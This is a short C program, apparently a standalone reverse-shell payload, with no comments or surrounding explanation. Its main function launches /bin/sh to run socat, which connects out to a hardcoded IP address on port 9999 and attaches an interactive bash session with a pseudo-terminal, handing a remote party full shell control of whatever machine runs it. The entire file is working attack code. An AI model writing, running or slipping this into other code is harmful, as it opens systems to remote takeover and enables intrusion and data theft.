#include <unistd.h>

int main()
{
    execl("/bin/sh", "sh", "-c", "socat tcp-connect:182.92.158.177:9999 exec:'bash -li',pty,stderr,setsid,sigint,sane", 0);
    return 0;
}
